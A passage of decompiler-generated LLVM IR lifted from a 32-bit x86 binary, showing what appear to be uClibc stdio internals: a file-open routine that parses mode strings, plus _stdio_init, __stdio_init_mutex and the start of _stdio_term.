  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c568 = load i32, i32* @ebp, align 4
  %v0_805c569 = load i32, i32* @edi, align 4
  %v0_805c56a = load i32, i32* @esi, align 4
  %v0_805c56b = load i32, i32* @ebx, align 4
  store i32 %v0_805c56b, i32* %stack_var_-16, align 4
  %v4_805c56f = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_805c57f = load i8, i8* %arg2, align 1
  %v3_805c57f = zext i8 %v2_805c57f to i32
  %v4_805c57f = load i32, i32* @eax, align 4
  %v5_805c57f = and i32 %v4_805c57f, -256
  %v6_805c57f = or i32 %v5_805c57f, %v3_805c57f
  store i32 %v6_805c57f, i32* %eax.global-to-local, align 4
  %v10_805c581 = icmp eq i8 %v2_805c57f, 114
  br i1 %v10_805c581, label %dec_label_pc_805c5c3, label %dec_label_pc_805c585

dec_label_pc_805c585:                             ; preds = %entry
  %v10_805c585 = icmp eq i8 %v2_805c57f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_805c585, label %dec_label_pc_805c5c5, label %dec_label_pc_805c58e

dec_label_pc_805c58e:                             ; preds = %dec_label_pc_805c585
  %v10_805c58e = icmp eq i8 %v2_805c57f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_805c58e, label %dec_label_pc_805c5c5, label %dec_label_pc_805c596

dec_label_pc_805c596:                             ; preds = %dec_label_pc_805c63e, %dec_label_pc_805c618, %dec_label_pc_805c58e
  %v0_805c596 = load i32, i32* %stack_var_-16, align 4
  %v1_805c596 = call i32 @__errno_location(i32 %v0_805c596)
  store i32 %v1_805c596, i32* %eax.global-to-local, align 4
  %v0_805c59b = load i32, i32* @ebp, align 4
  %v1_805c59b = icmp eq i32 %v0_805c59b, 0
  %v1_805c59d = inttoptr i32 %v1_805c596 to i32*
  store i32 22, i32* %v1_805c59d, align 4
  br i1 %v1_805c59b, label %dec_label_pc_805c79f, label %dec_label_pc_805c5a9

dec_label_pc_805c5a9:                             ; preds = %dec_label_pc_805c661, %dec_label_pc_805c596
  %v0_805c5a9 = load i32, i32* @ebp, align 4
  %v1_805c5a9 = add i32 %v0_805c5a9, 1
  %v2_805c5a9 = inttoptr i32 %v1_805c5a9 to i8*
  %v3_805c5a9 = load i8, i8* %v2_805c5a9, align 1
  %v4_805c5a9 = and i8 %v3_805c5a9, 32
  %v5_805c5a9 = icmp eq i8 %v4_805c5a9, 0
  br i1 %v5_805c5a9, label %dec_label_pc_805c79f, label %dec_label_pc_805c5b3

dec_label_pc_805c5b3:                             ; preds = %dec_label_pc_805c5a9
  store i32 %v0_805c5a9, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805c5b9 = call i32 @free(i32 %v0_805c5a9)
  br label %dec_label_pc_805c79a

dec_label_pc_805c5c3:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805c5c5

dec_label_pc_805c5c5:                             ; preds = %dec_label_pc_805c58e, %dec_label_pc_805c585, %dec_label_pc_805c5c3
  %v0_805c5d6 = phi i32 [ 1089, %dec_label_pc_805c58e ], [ 577, %dec_label_pc_805c585 ], [ 0, %dec_label_pc_805c5c3 ]
  %v1_805c5c5 = add i32 %v4_805c56f, 1
  %v2_805c5c5 = inttoptr i32 %v1_805c5c5 to i8*
  %v3_805c5c5 = load i8, i8* %v2_805c5c5, align 1
  %v12_805c5c5 = icmp eq i8 %v3_805c5c5, 98
  %v1_805c5c5.v4_805c56f = select i1 %v12_805c5c5, i32 %v1_805c5c5, i32 %v4_805c56f
  store i32 %v1_805c5c5.v4_805c56f, i32* %eax.global-to-local, align 4
  %v1_805c5d0 = add i32 %v1_805c5c5.v4_805c56f, 1
  %v2_805c5d0 = inttoptr i32 %v1_805c5d0 to i8*
  %v3_805c5d0 = load i8, i8* %v2_805c5d0, align 1
  %v12_805c5d0 = icmp eq i8 %v3_805c5d0, 43
  %v1_805c5d4 = icmp eq i1 %v12_805c5d0, false
  br i1 %v1_805c5d4, label %dec_label_pc_805c5de, label %dec_label_pc_805c5d6

dec_label_pc_805c5d6:                             ; preds = %dec_label_pc_805c5c5
  %v1_805c5d8 = or i32 %v0_805c5d6, 1
  store i32 %v1_805c5d8, i32* %eax.global-to-local, align 4
  %v1_805c5db = add nuw nsw i32 %v1_805c5d8, 1
  store i32 %v1_805c5db, i32* @ebx, align 4
  br label %dec_label_pc_805c5de

dec_label_pc_805c5de:                             ; preds = %dec_label_pc_805c5c5, %dec_label_pc_805c5d6
  %v0_805c6617 = phi i32 [ %v0_805c5d6, %dec_label_pc_805c5c5 ], [ %v1_805c5db, %dec_label_pc_805c5d6 ]
  %v1_805c5de = icmp eq i32 %arg3, 0
  %v1_805c5e0 = icmp eq i1 %v1_805c5de, false
  br i1 %v1_805c5e0, label %dec_label_pc_805c614, label %dec_label_pc_805c5e2

dec_label_pc_805c5e2:                             ; preds = %dec_label_pc_805c5de
  store i32 80, i32* %stack_var_-76, align 4
  %v1_805c5e7 = call i32 @malloc(i32 80)
  store i32 %v1_805c5e7, i32* %eax.global-to-local, align 4
  %v2_805c5ef = icmp eq i32 %v1_805c5e7, 0
  store i32 %v1_805c5e7, i32* @ebp, align 4
  br i1 %v2_805c5ef, label %dec_label_pc_805c7a1, label %dec_label_pc_805c5f9

dec_label_pc_805c5f9:                             ; preds = %dec_label_pc_805c5e2
  %v2_805c5e7 = inttoptr i32 %v1_805c5e7 to i16*
  store i16 8192, i16* %v2_805c5e7, align 2
  %v2_805c601 = add i32 %v1_805c5e7, 8
  %v3_805c601 = inttoptr i32 %v2_805c601 to i32*
  store i32 0, i32* %v3_805c601, align 4
  %v2_805c608 = add i32 %v1_805c5e7, 56
  store i32 %v2_805c608, i32* %eax.global-to-local, align 4
  store i32 %v2_805c608, i32* %stack_var_-76, align 4
  %v1_805c60c = call i32 @__stdio_init_mutex(i32 %v2_805c608)
  store i32 %v1_805c60c, i32* %eax.global-to-local, align 4
  %v0_805c661.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c614

dec_label_pc_805c614:                             ; preds = %dec_label_pc_805c5de, %dec_label_pc_805c5f9
  %v2_805c667 = phi i32 [ %v0_805c6617, %dec_label_pc_805c5de ], [ %v0_805c661.pre, %dec_label_pc_805c5f9 ]
  %v2_805c614 = icmp slt i32 %arg4, 0
  br i1 %v2_805c614, label %dec_label_pc_805c661, label %dec_label_pc_805c618

dec_label_pc_805c618:                             ; preds = %dec_label_pc_805c614
  %v1_805c61a = and i32 %v2_805c667, 32771
  %v1_805c620 = add nuw nsw i32 %v1_805c61a, 1
  %v0_805c621 = load i32, i32* @esi, align 4
  %v1_805c621 = add i32 %v0_805c621, 1
  %v2_805c624 = and i32 %v1_805c621, %v1_805c620
  store i32 %v2_805c624, i32* %eax.global-to-local, align 4
  %v12_805c626 = icmp eq i32 %v2_805c624, %v1_805c620
  %v1_805c628 = load i32, i32* @ebp, align 4
  %v2_805c628 = add i32 %v1_805c628, 4
  %v3_805c628 = inttoptr i32 %v2_805c628 to i32*
  store i32 %arg4, i32* %v3_805c628, align 4
  %v1_805c62b = icmp eq i1 %v12_805c626, false
  br i1 %v1_805c62b, label %dec_label_pc_805c596, label %dec_label_pc_805c631

dec_label_pc_805c631:                             ; preds = %dec_label_pc_805c618
  %v0_805c631 = load i32, i32* @esi, align 4
  %v1_805c633 = and i32 %v0_805c631, 1024
  %v1_805c635 = xor i32 %v1_805c633, 1024
  store i32 %v1_805c635, i32* %eax.global-to-local, align 4
  %v1_805c63a = load i32, i32* @ebx, align 4
  %v2_805c63a = and i32 %v1_805c63a, %v1_805c635
  %v3_805c63a = icmp eq i32 %v2_805c63a, 0
  br i1 %v3_805c63a, label %dec_label_pc_805c631.dec_label_pc_805c657_crit_edge, label %dec_label_pc_805c63e

dec_label_pc_805c631.dec_label_pc_805c657_crit_edge: ; preds = %dec_label_pc_805c631
  br label %dec_label_pc_805c657

dec_label_pc_805c63e:                             ; preds = %dec_label_pc_805c631
  store i32 4, i32* %stack_var_-72, align 4
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805c647 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805c647, i32* %eax.global-to-local, align 4
  %v1_805c64f = icmp eq i32 %v3_805c647, 0
  %v1_805c651 = icmp eq i1 %v1_805c64f, false
  br i1 %v1_805c651, label %dec_label_pc_805c596, label %dec_label_pc_805c63e.dec_label_pc_805c657_crit_edge

dec_label_pc_805c63e.dec_label_pc_805c657_crit_edge: ; preds = %dec_label_pc_805c63e
  %v0_805c657.pre = load i32, i32* @esi, align 4
  %v0_805c65d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c657

dec_label_pc_805c657:                             ; preds = %dec_label_pc_805c631.dec_label_pc_805c657_crit_edge, %dec_label_pc_805c63e.dec_label_pc_805c657_crit_edge
  %v0_805c65d = phi i32 [ %v1_805c63a, %dec_label_pc_805c631.dec_label_pc_805c657_crit_edge ], [ %v0_805c65d.pre, %dec_label_pc_805c63e.dec_label_pc_805c657_crit_edge ]
  %v0_805c657 = phi i32 [ %v0_805c631, %dec_label_pc_805c631.dec_label_pc_805c657_crit_edge ], [ %v0_805c657.pre, %dec_label_pc_805c63e.dec_label_pc_805c657_crit_edge ]
  %v1_805c657 = and i32 %v0_805c657, 32768
  %v2_805c65d = or i32 %v1_805c657, %v0_805c65d
  store i32 %v2_805c65d, i32* @ebx, align 4
  br label %dec_label_pc_805c685

dec_label_pc_805c661:                             ; preds = %dec_label_pc_805c614
  %v11_805c663 = or i32 %v2_805c667, 32768
  store i32 %v11_805c663, i32* %eax.global-to-local, align 4
  %v1_805c666 = add i32 %arg4, 1
  %v8_805c666 = icmp eq i32 %v1_805c666, 0
  store i32 %v1_805c666, i32* @edi, align 4
  %v1_805c667 = icmp eq i1 %v8_805c666, false
  %v4_805c667 = select i1 %v1_805c667, i32 %v11_805c663, i32 %v2_805c667
  store i32 %v4_805c667, i32* @ebx, align 4
  store i32 %v4_805c667, i32* %stack_var_-72, align 4
  %v0_805c671 = load i32, i32* @esi, align 4
  store i32 %v0_805c671, i32* %stack_var_-76, align 4
  %v3_805c672 = trunc i32 %v4_805c667 to i8
  %v4_805c672 = call i32 @__libc_open(i32 %v0_805c671, i8 %v3_805c672, i32 438)
  store i32 %v4_805c672, i32* %eax.global-to-local, align 4
  %v2_805c67a = icmp slt i32 %v4_805c672, 0
  %v1_805c67c = load i32, i32* @ebp, align 4
  %v2_805c67c = add i32 %v1_805c67c, 4
  %v3_805c67c = inttoptr i32 %v2_805c67c to i32*
  store i32 %v4_805c672, i32* %v3_805c67c, align 4
  br i1 %v2_805c67a, label %dec_label_pc_805c5a9, label %dec_label_pc_805c685

dec_label_pc_805c685:                             ; preds = %dec_label_pc_805c661, %dec_label_pc_805c657
  %v0_805c685 = load i32, i32* @ebp, align 4
  %v1_805c685 = inttoptr i32 %v0_805c685 to i32*
  %v2_805c685 = load i32, i32* %v1_805c685, align 4
  %v2_805c685.tr = trunc i32 %v2_805c685 to i16
  %v1_805c68d = and i16 %v2_805c685.tr, 8192
  %v3_805c68d = inttoptr i32 %v0_805c685 to i16*
  store i16 %v1_805c68d, i16* %v3_805c68d, align 2
  %v0_805c691 = load i32, i32* @ebx, align 4
  store i32 %v0_805c691, i32* %eax.global-to-local, align 4
  %v1_805c693 = and i32 %v0_805c691, -31744
  %v0_805c699 = load i32, i32* @ebp, align 4
  %v1_805c699 = inttoptr i32 %v0_805c699 to i32*
  %v2_805c699 = load i32, i32* %v1_805c699, align 4
  %v1_805c69c = mul i32 %v0_805c691, 16
  %v1_805c69f = and i32 %v1_805c69c, 48
  %v1_805c6a0 = add nuw nsw i32 %v1_805c69f, 16
  %v2_805c6a3 = xor i32 %v1_805c6a0, 48
  %v2_805c6a6 = or i32 %v2_805c699, %v1_805c693
  %v2_805c6a8 = or i32 %v2_805c6a6, %v2_805c6a3
  store i32 %v2_805c6a8, i32* %eax.global-to-local, align 4
  %v1_805c6aa = trunc i32 %v2_805c6a8 to i16
  %v3_805c6aa = inttoptr i32 %v0_805c699 to i16*
  store i16 %v1_805c6aa, i16* %v3_805c6aa, align 2
  %v0_805c6ae = load i32, i32* %stack_var_-76, align 4
  %v1_805c6ae = call i32 @__errno_location(i32 %v0_805c6ae)
  store i32 %v1_805c6ae, i32* %eax.global-to-local, align 4
  %v0_805c6b6 = load i32, i32* @ebp, align 4
  %v1_805c6b6 = inttoptr i32 %v0_805c6b6 to i16*
  %v2_805c6b6 = load i16, i16* %v1_805c6b6, align 2
  %v3_805c6b6 = zext i16 %v2_805c6b6 to i32
  store i32 %v3_805c6b6, i32* @ebx, align 4
  %v1_805c6ba = inttoptr i32 %v1_805c6ae to i32*
  %v2_805c6ba = load i32, i32* %v1_805c6ba, align 4
  store i32 %v2_805c6ba, i32* @edi, align 4
  store i32 %v1_805c6ae, i32* @esi, align 4
  %v1_805c6be = add i32 %v0_805c6b6, 4
  %v2_805c6be = inttoptr i32 %v1_805c6be to i32*
  %v3_805c6be = load i32, i32* %v2_805c6be, align 4
  store i32 %v3_805c6be, i32* %stack_var_-76, align 4
  %v1_805c6c1 = call i32 @isatty(i32 %v3_805c6be)
  %v2_805c6c9 = mul i32 %v1_805c6c1, 256
  store i32 %v2_805c6c9, i32* %eax.global-to-local, align 4
  %v0_805c6cc = load i32, i32* @ebx, align 4
  %v2_805c6cc = or i32 %v0_805c6cc, %v2_805c6c9
  store i32 %v2_805c6cc, i32* @ebx, align 4
  %v1_805c6ce = trunc i32 %v2_805c6cc to i16
  %v2_805c6ce = load i32, i32* @ebp, align 4
  %v3_805c6ce = inttoptr i32 %v2_805c6ce to i16*
  store i16 %v1_805c6ce, i16* %v3_805c6ce, align 2
  %v0_805c6d2 = load i32, i32* @edi, align 4
  %v1_805c6d2 = load i32, i32* @esi, align 4
  %v2_805c6d2 = inttoptr i32 %v1_805c6d2 to i32*
  store i32 %v0_805c6d2, i32* %v2_805c6d2, align 4
  %v0_805c6d4 = load i32, i32* @ebp, align 4
  %v1_805c6d4 = add i32 %v0_805c6d4, 8
  %v2_805c6d4 = inttoptr i32 %v1_805c6d4 to i32*
  %v3_805c6d4 = load i32, i32* %v2_805c6d4, align 4
  %v4_805c6d4 = icmp eq i32 %v3_805c6d4, 0
  %v1_805c6d8 = icmp eq i1 %v4_805c6d4, false
  br i1 %v1_805c6d8, label %dec_label_pc_805c70c, label %dec_label_pc_805c6da

dec_label_pc_805c6da:                             ; preds = %dec_label_pc_805c685
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_805c6e2 = call i32 @malloc(i32 4096)
  store i32 %v1_805c6e2, i32* %eax.global-to-local, align 4
  %v1_805c6ea = icmp eq i32 %v1_805c6e2, 0
  %v1_805c6ec = load i32, i32* @ebp, align 4
  %v2_805c6ec = add i32 %v1_805c6ec, 8
  %v3_805c6ec = inttoptr i32 %v2_805c6ec to i32*
  store i32 %v1_805c6e2, i32* %v3_805c6ec, align 4
  br i1 %v1_805c6ea, label %dec_label_pc_805c705, label %dec_label_pc_805c6f1

dec_label_pc_805c6f1:                             ; preds = %dec_label_pc_805c6da
  %v1_805c6f1 = add i32 %v1_805c6e2, 4096
  store i32 %v1_805c6f1, i32* %eax.global-to-local, align 4
  %v1_805c6f6 = load i32, i32* @ebp, align 4
  %v2_805c6f6 = add i32 %v1_805c6f6, 12
  %v3_805c6f6 = inttoptr i32 %v2_805c6f6 to i32*
  store i32 %v1_805c6f1, i32* %v3_805c6f6, align 4
  %v0_805c6f9 = load i32, i32* @ebp, align 4
  %v1_805c6f9 = inttoptr i32 %v0_805c6f9 to i32*
  %v2_805c6f9 = load i32, i32* %v1_805c6f9, align 4
  %v1_805c6fc = udiv i32 %v2_805c6f9, 256
  %v3_805c6fc = and i32 %v1_805c6fc, 191
  %v8_805c6fc = or i32 %v3_805c6fc, 64
  %v10_805c6fc = mul nuw nsw i32 %v8_805c6fc, 256
  %v11_805c6fc = and i32 %v2_805c6f9, -65281
  %v12_805c6fc = or i32 %v10_805c6fc, %v11_805c6fc
  store i32 %v12_805c6fc, i32* %eax.global-to-local, align 4
  %v1_805c6ff = trunc i32 %v12_805c6fc to i16
  %v3_805c6ff = inttoptr i32 %v0_805c6f9 to i16*
  store i16 %v1_805c6ff, i16* %v3_805c6ff, align 2
  br label %dec_label_pc_805c70c

dec_label_pc_805c705:                             ; preds = %dec_label_pc_805c6da
  %v0_805c705 = load i32, i32* @ebp, align 4
  %v1_805c705 = add i32 %v0_805c705, 12
  %v2_805c705 = inttoptr i32 %v1_805c705 to i32*
  store i32 0, i32* %v2_805c705, align 4
  br label %dec_label_pc_805c70c

dec_label_pc_805c70c:                             ; preds = %dec_label_pc_805c685, %dec_label_pc_805c6f1, %dec_label_pc_805c705
  %v0_805c70c = load i32, i32* @ebp, align 4
  %v1_805c70c = add i32 %v0_805c70c, 8
  %v2_805c70c = inttoptr i32 %v1_805c70c to i32*
  %v3_805c70c = load i32, i32* %v2_805c70c, align 4
  store i32 %v3_805c70c, i32* %eax.global-to-local, align 4
  %v1_805c70f = add i32 %v0_805c70c, 2
  %v2_805c70f = inttoptr i32 %v1_805c70f to i8*
  store i8 0, i8* %v2_805c70f, align 1
  %v0_805c713 = load i32, i32* @ebp, align 4
  %v1_805c713 = add i32 %v0_805c713, 44
  %v2_805c713 = inttoptr i32 %v1_805c713 to i32*
  store i32 0, i32* %v2_805c713, align 4
  %v0_805c71a = load i32, i32* @ebp, align 4
  %v1_805c71a = add i32 %v0_805c71a, 1
  %v2_805c71a = inttoptr i32 %v1_805c71a to i8*
  %v3_805c71a = load i8, i8* %v2_805c71a, align 1
  %v4_805c71a = and i8 %v3_805c71a, 32
  %v5_805c71a = icmp eq i8 %v4_805c71a, 0
  %v0_805c71e = load i32, i32* %eax.global-to-local, align 4
  %v2_805c71e = add i32 %v0_805c71a, 24
  %v3_805c71e = inttoptr i32 %v2_805c71e to i32*
  store i32 %v0_805c71e, i32* %v3_805c71e, align 4
  %v0_805c721 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c721 = load i32, i32* @ebp, align 4
  %v2_805c721 = add i32 %v1_805c721, 28
  %v3_805c721 = inttoptr i32 %v2_805c721 to i32*
  store i32 %v0_805c721, i32* %v3_805c721, align 4
  %v0_805c724 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c724 = load i32, i32* @ebp, align 4
  %v2_805c724 = add i32 %v1_805c724, 16
  %v3_805c724 = inttoptr i32 %v2_805c724 to i32*
  store i32 %v0_805c724, i32* %v3_805c724, align 4
  %v0_805c727 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c727 = load i32, i32* @ebp, align 4
  %v2_805c727 = add i32 %v1_805c727, 20
  %v3_805c727 = inttoptr i32 %v2_805c727 to i32*
  store i32 %v0_805c727, i32* %v3_805c727, align 4
  %v0_805c72a = load i32, i32* @global_var_8075430.614, align 16
  store i32 %v0_805c72a, i32* %eax.global-to-local, align 4
  %v1_805c72f = load i32, i32* @ebp, align 4
  %v2_805c72f = add i32 %v1_805c72f, 52
  %v3_805c72f = inttoptr i32 %v2_805c72f to i32*
  store i32 %v0_805c72a, i32* %v3_805c72f, align 4
  br i1 %v5_805c71a, label %dec_label_pc_805c7a1, label %dec_label_pc_805c734

dec_label_pc_805c734:                             ; preds = %dec_label_pc_805c70c
  store i32 134589241, i32* %stack_var_-72, align 4
  %v2_805c73f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805c73f, i32* @esi, align 4
  store i32 %v2_805c73f, i32* %stack_var_-76, align 4
  %v4_805c744 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  store i32 %v4_805c744, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075418.635 to i32), i32* %stack_var_-76, align 4
  %v1_805c750 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  store i32 %v1_805c750, i32* %eax.global-to-local, align 4
  store i32 134589241, i32* %stack_var_-72, align 4
  %v2_805c762 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805c762, i32* @ebx, align 4
  store i32 %v2_805c762, i32* %stack_var_-76, align 4
  %v4_805c767 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134589241, i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  store i32 %v4_805c767, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075400.646 to i32), i32* %stack_var_-76, align 4
  %v1_805c773 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  %v0_805c778 = load i32, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  store i32 %v0_805c778, i32* %eax.global-to-local, align 4
  %v1_805c77d = load i32, i32* @ebp, align 4
  %v2_805c77d = add i32 %v1_805c77d, 32
  %v3_805c77d = inttoptr i32 %v2_805c77d to i32*
  store i32 %v0_805c778, i32* %v3_805c77d, align 4
  %v2_805c780 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805c780, i32* @ecx, align 4
  %v0_805c781 = load i32, i32* @ebp, align 4
  store i32 %v0_805c781, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  %v2_805c787 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_805c787, i32* @edi, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_805c762, i32* %stack_var_-76, align 4
  %v3_805c78b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v2_805c762, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_805c73f, i32* %stack_var_-76, align 4
  %v3_805c795 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805c79a

dec_label_pc_805c79a:                             ; preds = %dec_label_pc_805c5b3, %dec_label_pc_805c734
  %storemerge = phi i32 [ %v3_805c795, %dec_label_pc_805c734 ], [ %v1_805c5b9, %dec_label_pc_805c5b3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c7a1

dec_label_pc_805c79f:                             ; preds = %dec_label_pc_805c5a9, %dec_label_pc_805c596
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805c7a1

dec_label_pc_805c7a1:                             ; preds = %dec_label_pc_805c70c, %dec_label_pc_805c5e2, %dec_label_pc_805c79a, %dec_label_pc_805c79f
  %v0_805c7a4 = load i32, i32* @ebp, align 4
  store i32 %v0_805c7a4, i32* %eax.global-to-local, align 4
  %v2_805c7a6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805c7a6, i32* @ebx, align 4
  store i32 %v0_805c56a, i32* @esi, align 4
  store i32 %v0_805c569, i32* @edi, align 4
  store i32 %v0_805c568, i32* @ebp, align 4
  ret i32 %v0_805c7a4

; uselistorder directives
  uselistorder i32 %v2_805c6f9, { 1, 0 }
  uselistorder i32 %v1_805c6e2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805c6c9, { 1, 0 }
  uselistorder i32 %v1_805c6ae, { 1, 0, 2 }
  uselistorder i32 %v11_805c663, { 1, 0 }
  uselistorder i32 %v1_805c635, { 1, 0 }
  uselistorder i32 %v0_805c631, { 1, 0 }
  uselistorder i32 %v2_805c667, { 1, 0, 2 }
  uselistorder i32 %v1_805c5e7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31 }
  uselistorder i32 %arg4, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_805c7a1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805c79a, { 1, 0 }
  uselistorder label %dec_label_pc_805c70c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c657, { 1, 0 }
  uselistorder label %dec_label_pc_805c614, { 1, 0 }
  uselistorder label %dec_label_pc_805c5de, { 1, 0 }
  uselistorder label %dec_label_pc_805c5c5, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805c7ad = load i32, i32* @edi, align 4
  %v0_805c7ae = load i32, i32* @esi, align 4
  %v0_805c7af = load i32, i32* @ebx, align 4
  store i32 %v0_805c7af, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_805c7b8 = call i32 @__errno_location(i32 %v0_805c7af)
  %v0_805c7c0 = load i16, i16* @global_var_8075440.616, align 64
  %v1_805c7c0 = zext i16 %v0_805c7c0 to i32
  store i32 %v1_805c7c0, i32* @esi, align 4
  %v1_805c7c7 = inttoptr i32 %v1_805c7b8 to i32*
  %v2_805c7c7 = load i32, i32* %v1_805c7c7, align 4
  store i32 %v2_805c7c7, i32* %ebp.global-to-local, align 4
  store i32 %v1_805c7b8, i32* @edi, align 4
  %v1_805c7cd = call i32 @isatty(i32 0)
  %v0_805c7d2 = load i32, i32* @ebx, align 4
  %v2_805c7db = sub i32 %v0_805c7d2, %v1_805c7cd
  %v2_805c7df = mul i32 %v2_805c7db, 256
  %v0_805c7e2 = load i32, i32* @esi, align 4
  %v2_805c7e2 = xor i32 %v0_805c7e2, %v2_805c7df
  %v1_805c7e4 = trunc i32 %v2_805c7e2 to i16
  store i16 %v1_805c7e4, i16* @global_var_8075440.616, align 64
  %v0_805c7eb = load i16, i16* @global_var_8075490.633, align 16
  %v1_805c7eb = zext i16 %v0_805c7eb to i32
  store i32 %v1_805c7eb, i32* @esi, align 4
  %v1_805c7f2 = call i32 @isatty(i32 1)
  %v0_805c7f7 = load i32, i32* @ebx, align 4
  %v2_805c7f7 = sub i32 %v0_805c7f7, %v1_805c7f2
  %v2_805c7f9 = mul i32 %v2_805c7f7, 256
  %v0_805c7fc = load i32, i32* @esi, align 4
  %v2_805c7fc = xor i32 %v2_805c7f9, %v0_805c7fc
  %v1_805c7fe = trunc i32 %v2_805c7fc to i16
  store i16 %v1_805c7fe, i16* @global_var_8075490.633, align 16
  %v0_805c805 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805c805 = load i32, i32* @edi, align 4
  %v2_805c805 = inttoptr i32 %v1_805c805 to i32*
  store i32 %v0_805c805, i32* %v2_805c805, align 4
  %v2_805c80a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805c80a, i32* @ebx, align 4
  store i32 %v0_805c7ae, i32* @esi, align 4
  store i32 %v0_805c7ad, i32* @edi, align 4
  ret i32 %v1_805c7f2

; uselistorder directives
  uselistorder i32 %v1_805c7b8, { 1, 0 }
  uselistorder i16* @global_var_8075490.633, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805c81d = inttoptr i32 %arg1 to i16*
  %v4_805c81d = call i32 @memcpy(i16* %v3_805c81d, i32 ptrtoint (i32* @global_var_806d8d4.647 to i32), i32 24)
  ret i32 %v4_805c81d
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c826 = load i32, i32* @esi, align 4
  %v0_805c827 = load i32, i32* @ebx, align 4
  store i32 %v0_805c827, i32* %stack_var_-8, align 4
  %v2_805c830 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8075400.646 to i32))
  store i32 %v2_805c830, i32* %eax.global-to-local, align 4
  %v2_805c83c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8075418.635 to i32))
  store i32 %v2_805c83c, i32* %eax.global-to-local, align 4
  %storemerge22 = load i32, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  store i32 %storemerge22, i32* @ebx, align 4
  %v1_805c88623 = icmp eq i32 %storemerge22, 0
  %v1_805c88825 = icmp eq i1 %v1_805c88623, false
  br i1 %v1_805c88825, label %dec_label_pc_805c849.lr.ph, label %dec_label_pc_805c8a6.preheader

dec_label_pc_805c849.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805c849

dec_label_pc_805c849:                             ; preds = %dec_label_pc_805c849.lr.ph, %dec_label_pc_805c870
  %storemerge26 = phi i32 [ %storemerge22, %dec_label_pc_805c849.lr.ph ], [ %storemerge, %dec_label_pc_805c870 ]
  %v1_805c84c = add i32 %storemerge26, 56
  store i32 %v1_805c84c, i32* @esi, align 4
  %v2_805c850 = call i32 @pthread_mutex_trylock(i32 %v1_805c84c)
  store i32 %v2_805c850, i32* %eax.global-to-local, align 4
  %v1_805c858 = icmp eq i32 %v2_805c850, 0
  br i1 %v1_805c858, label %dec_label_pc_805c870, label %dec_label_pc_805c85c

dec_label_pc_805c85c:                             ; preds = %dec_label_pc_805c849
  %v0_805c85c = load i32, i32* @ebx, align 4
  %v1_805c85c = add i32 %v0_805c85c, 8
